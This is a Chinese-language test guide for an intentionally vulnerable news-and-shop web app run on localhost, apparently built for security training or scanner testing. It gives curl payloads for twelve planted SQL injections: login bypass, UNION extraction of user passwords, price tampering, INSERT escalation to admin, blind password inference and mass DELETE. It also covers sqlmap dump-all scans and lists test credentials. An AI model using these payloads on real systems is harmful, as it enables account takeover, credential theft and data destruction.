# SQL注入漏洞测试指南

## 🚀 快速开始

### 1. 启动应用
```bash
docker-compose up --build
```

### 2. 等待服务启动
看到以下信息表示启动成功：
```
backend_1   | 新闻系统后端已启动，运行于 http://localhost:3001
frontend_1  | ➜  Local:   http://localhost:3000/
```

### 3. 验证所有端点正常工作

```bash
# 测试新闻API
curl http://localhost:3001/api/news
curl http://localhost:3001/api/news/1
curl "http://localhost:3001/api/news/category/科技"

# 测试产品API
curl http://localhost:3001/api/products
curl "http://localhost:3001/api/products/search?q=鼠标"
curl http://localhost:3001/api/products/1

# 测试用户API
curl http://localhost:3001/api/users
curl "http://localhost:3001/api/users/search?q=admin"

# 测试订单API
curl http://localhost:3001/api/orders
curl http://localhost:3001/api/orders/user/1
```

如果所有请求都返回JSON数据（而不是错误），说明修复成功！

---

## ✅ 验证修复的关键问题

### 问题1: 产品搜索报错 "no such column: search"

**测试命令**:
```bash
curl "http://localhost:3001/api/products/search?q=鼠标"
```

**预期结果**: ✅ 返回产品列表，不报错

**错误结果**: ❌ 返回 `{"error":"SQLITE_ERROR: no such column: search"}`

### 问题2: 新闻分类筛选不可见

**测试步骤**:
1. 访问 http://localhost:3000/news
2. 查看页面是否有"按分类筛选"下拉框

**预期结果**: ✅ 看到分类筛选下拉框，包含"科技"、"健康"、"旅游"等选项

**错误结果**: ❌ 看不到分类筛选功能

---

## 🧪 12个SQL注入漏洞测试

### SQL-1: 新闻详情（整数型注入）

**前端测试**:
1. 访问 http://localhost:3000/news
2. 点击任意新闻标题
3. 在浏览器地址栏修改URL: `http://localhost:3000/news/1 OR 1=1--`

**API测试**:
```bash
curl "http://localhost:3001/api/news/1 OR 1=1--"
```

**预期**: 返回多条新闻记录

---

### SQL-2: 新闻分类（字符串型注入）

**前端测试**:
1. 访问 http://localhost:3000/news
2. 在"按分类筛选"下拉框选择任意分类
3. 打开开发者工具（F12）→ Network标签
4. 找到 `/api/news/category/xxx` 请求
5. 右键 → Copy → Copy as cURL
6. 修改category参数测试注入

**API测试**:
```bash
# 绕过分类限制
curl "http://localhost:3001/api/news/category/' OR '1'='1"

# UNION查询用户密码
curl "http://localhost:3001/api/news/category/test' UNION SELECT id,username,password,email,role,NULL FROM users_db--"
```

**预期**: 返回所有新闻或用户数据

---

### SQL-3: 产品详情（Error-based注入）

**前端测试**:
1. 访问 http://localhost:3000/shop → 产品商城
2. 点击任意产品的"查看详情"
3. 查看产品ID

**API测试**:
```bash
# 触发错误
curl "http://localhost:3001/api/products/1 UNION SELECT * FROM users_db"

# 正确的UNION
curl "http://localhost:3001/api/products/999 UNION SELECT id,username,password,email,role,created_at FROM users_db"
```

**预期**: 返回用户凭证数据

---

### SQL-4: 产品搜索（UNION注入）

**前端测试**:
1. 访问 http://localhost:3000/shop → 产品商城
2. 在搜索框输入"鼠标"测试正常功能
3. 输入SQL注入payload测试

**API测试**:
```bash
# 正常搜索（验证修复成功）
curl "http://localhost:3001/api/products/search?q=鼠标"

# UNION查询数据库表
curl "http://localhost:3001/api/products/search?q=' UNION SELECT 1,name,sql,4,5,6 FROM sqlite_master WHERE type='table'--"

# 提取用户凭证
curl "http://localhost:3001/api/products/search?q=' UNION SELECT id,username,password,email,role,created_at FROM users_db--"
```

**预期**: 第一个命令返回产品，后两个返回数据库信息

---

### SQL-5: 产品库存更新（UPDATE注入）

**前端测试**:
1. 访问 http://localhost:3000/shop → 产品商城
2. 点击"查看详情"
3. 在"新库存数量"框输入恶意payload
4. 点击"更新库存"

**API测试**:
```bash
# 修改产品价格
curl -X PUT http://localhost:3001/api/products/1/stock \
  -H "Content-Type: application/json" \
  -d '{"quantity":"999, price=0.01 WHERE id=1--"}'

# 验证价格被修改
curl http://localhost:3001/api/products/1
```

**预期**: 产品价格被修改为0.01

---

### SQL-6: 用户登录（Boolean盲注）

**前端测试**:
1. 访问 http://localhost:3000/login
2. 用户名输入: `admin'--`
3. 密码随意输入
4. 点击登录

**API测试**:
```bash
# 绕过密码验证
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'
```

**预期**: 登录成功，返回admin用户信息和token

---

### SQL-7: 用户注册（INSERT注入）

**前端测试**:
1. 访问 http://localhost:3000/login
2. 切换到"注册"标签
3. 邮箱输入: `hack@test.com', 'admin')}--`
4. 填写其他信息后注册

**API测试**:
```bash
curl -X POST http://localhost:3001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass","email":"test@test.com'\'', '\''admin'\'')}--"}'

# 验证是否成为admin
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass"}'
```

**预期**: 注册成功，登录后role为admin

---

### SQL-8: 用户名检查（Time-based盲注）

**前端测试**:
1. 访问 http://localhost:3000/login
2. 切换到"注册"标签
3. 滚动到底部的"检查用户名是否可用"
4. 输入恶意payload点击检查

**API测试**:
```bash
# Boolean盲注
curl "http://localhost:3001/api/auth/check-username/admin' AND (SELECT substr(password,1,1) FROM users_db WHERE username='admin')='a'--"
```

**预期**: 通过响应差异推断密码

---

### SQL-9: 用户订单查询（JOIN注入）

**前端测试**:
1. 访问 http://localhost:3000/shop → 订单管理
2. 在"按用户查询"框输入: `1 OR 1=1--`
3. 点击"查询用户订单"

**API测试**:
```bash
curl "http://localhost:3001/api/orders/user/1 OR 1=1--"
```

**预期**: 返回所有用户的订单

---

### SQL-10: 订单排序（ORDER BY注入）

**前端测试**:
1. 访问 http://localhost:3000/shop → 订单管理
2. 使用浏览器开发者工具拦截请求
3. 修改sort参数

**API测试**:
```bash
curl "http://localhost:3001/api/orders?sort=(SELECT COUNT(*) FROM users_db)&order=DESC"
```

**预期**: 正常返回订单列表（排序基于用户数）

---

### SQL-11: 订单删除（DELETE注入）

**前端测试**:
1. 访问 http://localhost:3000/shop → 订单管理
2. 使用开发者工具拦截删除请求
3. 修改订单ID为 `1 OR 1=1--`

**API测试**:
```bash
# 先查看现有订单
curl http://localhost:3001/api/orders

# 删除所有订单
curl -X DELETE "http://localhost:3001/api/orders/1 OR 1=1--"

# 验证是否全部删除
curl http://localhost:3001/api/orders
```

**预期**: 所有订单被删除

---

### SQL-12: 用户搜索（LIKE注入）

**前端测试**:
1. 访问 http://localhost:3000/admin → 用户管理
2. 在搜索框输入: `%' OR '1'='1`
3. 点击搜索

**API测试**:
```bash
# 正常搜索（验证修复成功）
curl "http://localhost:3001/api/users/search?q=admin"

# SQL注入
curl "http://localhost:3001/api/users/search?q=%25' OR '1'='1"

# UNION查询
curl "http://localhost:3001/api/users/search?q=%25' UNION SELECT id,name,description,price FROM products--"
```

**预期**: 第一个返回匹配用户，后两个返回所有用户或产品数据

---

## 🛠️ 使用自动化工具

### SQLMap扫描

```bash
# 扫描新闻详情（SQL-1）
sqlmap -u "http://localhost:3001/api/news/1" --batch

# 扫描产品搜索（SQL-4）
sqlmap -u "http://localhost:3001/api/products/search?q=test" --batch

# 扫描登录（SQL-6）
sqlmap -u "http://localhost:3001/api/auth/login" \
  --data='{"username":"admin","password":"pass"}' \
  --method=POST \
  --content-type="application/json" \
  --batch

# 完整扫描并提取数据
sqlmap -u "http://localhost:3001/api/news/1" --batch --dump-all
```

### Burp Suite扫描

1. 启动Burp Suite
2. 配置浏览器代理到 127.0.0.1:8080
3. 访问 http://localhost:3000 并浏览各个功能
4. 在Burp的Target标签查看站点地图
5. 右键选择要测试的请求 → Send to Scanner
6. 查看Scanner标签的结果

---

## 🐛 常见问题

### Q: 产品搜索报错 "no such column: search"
**A**: 已修复。确保使用最新代码，`/api/products/search` 已移到 `/api/products/:id` 之前。

### Q: 新闻分类筛选看不到
**A**: 已修复。访问 http://localhost:3000/news 应该能看到分类筛选下拉框。

### Q: 用户搜索不工作
**A**: 已修复。路由顺序已调整，`/api/users/search` 现在在 `/api/users/:id` 之前。

### Q: SQL注入payload没有生效
**A**: 检查以下几点：
- URL编码是否正确（特殊字符需要编码）
- 引号是否正确闭合
- 注释符 `--` 后面需要有空格，或使用 `%23` 表示 `#`
- 列数是否匹配（使用ORDER BY确定列数）

---

## 📊 数据库快速参考

### 测试账户
```
admin / admin123 (管理员)
editor / editor456 (编辑)
user1 / pass123 (普通用户)
```

### 表结构速查

**users_db**: id, username, password, email, role, created_at
**products**: id, name, description, price, stock, category
**orders**: id, user_id, product_id, quantity, total_price, status, order_date
**news**: id, title, content, author, publish_date, category, views, status

---

## 🎯 推荐测试流程

### 1. 基础功能测试（5分钟）
- 访问所有主要页面，确保UI正常显示
- 测试搜索、筛选等功能
- 查看浏览器控制台是否有错误

### 2. SQL注入手动测试（15分钟）
- 使用curl测试所有12个漏洞
- 验证每个漏洞都能被利用
- 确认返回的数据符合预期

### 3. 自动化工具扫描（30分钟）
- 使用SQLMap扫描主要端点
- 使用Burp Suite进行全面扫描
- 对比自动化工具的发现结果

### 4. 前端入口验证（10分钟）
- 确认每个SQL注入都能通过前端界面触发
- 验证普通用户能够发现这些注入点
- 测试工具能够通过爬虫发现所有端点

---

## 📝 修复验证报告模板

```
测试日期: ___________
测试人员: ___________

[ ] 所有API端点正常响应
[ ] 产品搜索功能正常（无"no such column"错误）
[ ] 新闻分类筛选可见可用
[ ] 用户搜索功能正常

SQL注入漏洞验证:
[ ] SQL-1: 新闻详情 - 整数型注入
[ ] SQL-2: 新闻分类 - 字符串型注入
[ ] SQL-3: 产品详情 - Error-based注入
[ ] SQL-4: 产品搜索 - UNION注入
[ ] SQL-5: 产品库存 - UPDATE注入
[ ] SQL-6: 用户登录 - Boolean盲注
[ ] SQL-7: 用户注册 - INSERT注入
[ ] SQL-8: 用户名检查 - Time-based盲注
[ ] SQL-9: 用户订单 - JOIN注入
[ ] SQL-10: 订单排序 - ORDER BY注入
[ ] SQL-11: 订单删除 - DELETE注入
[ ] SQL-12: 用户搜索 - LIKE注入

自动化工具测试:
[ ] SQLMap成功发现并利用漏洞
[ ] Burp Suite成功识别注入点

结论: ___________
```

---

**最后更新**: 2025-11-25  
**状态**: ✅ 所有已知问题已修复

